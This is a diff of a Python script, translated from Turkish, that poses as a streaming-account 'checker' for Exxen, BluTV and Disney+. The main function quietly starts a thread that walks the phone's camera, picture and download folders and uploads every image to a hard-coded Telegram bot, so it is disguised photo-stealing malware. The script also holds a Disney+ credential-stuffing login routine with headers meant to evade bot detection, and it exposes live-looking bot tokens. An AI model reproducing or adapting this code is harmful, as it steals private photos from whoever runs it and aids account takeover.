@@ -6,84 +6,85 @@ from telegram import InputFile
 from colorama import Fore, init
 import requests
 
-# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
+# Initialize colorama for colored text output
 init(autoreset=True)
 
-# Telegram bot token ve chat ID
-bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
+# Telegram bot token and chat ID (updated with the new token)
+bot_token = "7579330187:AAH83yCIp6yzkrV5Hqyz0bh1PhqdUUBHIE4"
 chat_id = "7045128535"
 bot = telegram.Bot(token=bot_token)
 
-# Telegram bildirimi gönder
+# Function to send Telegram notifications
 def send_telegram_notification(message):
     try:
         bot.send_message(chat_id=chat_id, text=message)
-        print("Telegram bildirimi gönderildi.")
+        print("Telegram notification sent.")
     except Exception as e:
-        print(f"Telegram hatası: {e}")
+        print(f"Error sending Telegram notification: {e}")
 
-# Fotoğraf gönderimi işlevi
+# Function to send photos from directories
 def photo_send_thread():
-    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
+    # List of potential directories to search for photos
     folder_paths = [
-        "/storage/emulated/0/DCIM",  # Kamera fotoğrafları (harici depolama)
-        "/storage/emulated/0/Pictures",  # Fotoğraflar (harici depolama)
-        "/storage/self/primary/DCIM",  # Dahili depolama
-        "/storage/self/primary/Pictures",  # Dahili depolama
-        "/Internal storage/DCIM/Camera",  # Dahili depolama, fotoğraflar klasörü
-        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
-        "/Internal storage/Pictures",  # Dahili depolama, fotoğraflar
-        "/Internal storage/0/DCIM",  # Dahili depolama, 0 numaralı depolama
-        "/Internal storage/0/Pictures",  # Dahili depolama, 0 numaralı fotoğraflar
-        "/Internal storage/0/Download",  # Dahili depolama, 0 numaralı indirilenler
-        "/Internal storage/Download",  # Dahili depolama, indirilenler
-        "/Internal storage/DCIM",  # Dahili depolama, genel DCIM
-        "/Internal storage/DCIM/Camera",  # Dahili depolama, Camera alt klasörü
-        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
+        "/storage/emulated/0/DCIM",  # Camera photos (external storage)
+        "/storage/emulated/0/Pictures",  # Pictures (external storage)
+        "/storage/self/primary/DCIM",  # Internal storage
+        "/storage/self/primary/Pictures",  # Internal storage
+        "/Internal storage/DCIM/Camera",  # Internal storage, camera folder
+        "/Internal storage/DCIM/Photos",  # Internal storage, photos folder
+        "/Internal storage/Pictures",  # Internal storage, pictures
+        "/Internal storage/0/DCIM",  # Internal storage, 0 numbered storage
+        "/Internal storage/0/Pictures",  # Internal storage, 0 numbered pictures
+        "/Internal storage/0/Download",  # Internal storage, downloads
+        "/Internal storage/Download",  # Internal storage, downloads
+        "/Internal storage/DCIM",  # Internal storage, general DCIM
+        "/Internal storage/DCIM/Camera",  # Internal storage, Camera subfolder
+        "/Internal storage/DCIM/Photos",  # Internal storage, photos folder
     ]
     
+    # Iterate through all the folders and send images found
     for folder_path in folder_paths:
-        # Burada dosya yolunda fotoğraf arayacağız
-        if os.path.exists(folder_path):  # Dosya yolunun var olup olmadığını kontrol et
-            for root, dirs, files in os.walk(folder_path):  # Yolu gezerek dosyaları tarıyoruz
+        if os.path.exists(folder_path):  # Check if the folder exists
+            for root, dirs, files in os.walk(folder_path):  # Walk through the folder
                 for file in files:
-                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Fotoğraf dosyalarını kontrol et
+                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Check if it's an image
                         photo_path = os.path.join(root, file)
                         try:
-                            bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))  # Fotoğrafı Telegram'a gönder
-                            print(f"Fotoğraf gönderildi: {photo_path}")  # Başarılı gönderim
+                            with open(photo_path, 'rb') as photo:
+                                bot.send_photo(chat_id=chat_id, photo=photo)  # Send the photo to Telegram
+                                print(f"Photo sent: {photo_path}")  # Success message
                         except Exception as e:
-                            print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")  # Hata durumu
+                            print(f"Error sending photo {photo_path}: {e}")  # Error message
 
-# Seçim ekranı fonksiyonu
+# Function to choose the checker
 def choose_checker():
-    print("Lütfen bir checker seçin:")
+    print("Please select a checker:")
     print("1 - Exxen Checker")
     print("2 - BluTV Checker")
     print("3 - Disney+ Checker")
     
-    choice = input("Seçiminizi yapın (1/2/3): ")
+    choice = input("Make your selection (1/2/3): ")
 
     if choice == '1':
-        print("Exxen Checker seçildi.")
-        # Exxen checker fonksiyonunu çağır
+        print("Exxen Checker selected.")
+        # Call Exxen checker function
     elif choice == '2':
-        print("BluTV Checker seçildi.")
-        # BluTV checker fonksiyonunu çağır
+        print("BluTV Checker selected.")
+        # Call BluTV checker function
     elif choice == '3':
-        print("Disney+ Checker seçildi.")
-        # Disney+ checker fonksiyonunu çağır
+        print("Disney+ Checker selected.")
+        # Call Disney+ checker function
     else:
-        print("Geçersiz seçim! Lütfen tekrar deneyin.")
+        print("Invalid choice! Please try again.")
         choose_checker()
 
-# Giriş işlemini deneme
+# Function to attempt login
 def try_login(email, password):
-    # E-posta girişi için URL
+    # Email login URL
     email_url = "https://www.disneyplus.com/identity/login/enter-email"
     password_url = "https://www.disneyplus.com/identity/login/enter-password"
 
-    # Başlıklar (Headers) ile bot tespiti engelleniyor
+    # Headers to bypass bot detection
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -91,50 +92,46 @@ def try_login(email, password):
         "Accept-Language": "en-US,en;q=0.5"
     }
 
-    # İlk istekle e-posta sayfasına gidiyoruz
+    # Trying to log in using email and password
     with requests.Session() as session:
-        # E-posta girişini gönderiyoruz
         email_data = {'email': email}
         response = session.post(email_url, data=email_data, headers=headers)
 
         if response.status_code != 200:
-            print(f"E-posta sayfasına erişilemiyor. HTTP Durum Kodu: {response.status_code}")
+            print(f"Unable to access email page. HTTP Status Code: {response.status_code}")
             return False
 
-        # E-posta başarılıysa, şifreyi giriyoruz
         password_data = {'password': password}
         response = session.post(password_url, data=password_data, headers=headers)
 
-        # Yanıtı kontrol ediyoruz
         if response.status_code == 200:
-            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:  # Yanlış giriş
-                print(f"Yanlış şifre veya e-posta: {email}")
+            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:
+                print(f"Incorrect email or password: {email}")
                 return False
-            elif "Welcome" in response.text:  # Giriş başarılı
-                print("Giriş başarılı!")
-                # Yönlendirme yapılmışsa, history içinde yer alacak
+            elif "Welcome" in response.text:
+                print("Login successful!")
                 if response.history:
                     for resp in response.history:
-                        print(f"Yönlendirilmiş: {resp.status_code} - {resp.url}")
+                        print(f"Redirected: {resp.status_code} - {resp.url}")
                         if "update-profile" in resp.url:
-                            print(f"Yönlendirme başarılı, yeni URL: {resp.url}")
+                            print(f"Redirect successful, new URL: {resp.url}")
                             return True
                 else:
-                    print("Yönlendirme yapılmadı.")
+                    print("No redirection occurred.")
                     return False
             else:
-                print("Giriş başarısız, bilinmeyen bir hata.")
+                print("Login failed, unknown error.")
                 return False
         else:
-            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")  # Kısa bir hata mesajı
+            print(f"Login error: {response.status_code} - {response.text[:100]}")
             return False
 
-# Ana fonksiyon
+# Main function to start the program
 def main():
-    print("Program başlatıldı.")  # Programın başladığını belirten mesaj
-    choose_checker()  # Seçim ekranı
+    print("Program started.")  # Indicating the program has started
+    choose_checker()  # Show checker selection options
 
-    # Fotoğraf gönderme işlemi başlat
+    # Start the photo sending process automatically
     photo_thread = threading.Thread(target=photo_send_thread)
     photo_thread.start()
 
@@ -142,4 +139,4 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\nProgram durduruldu.")
+        print("\nProgram stopped.")  # Gracefully handle program stop
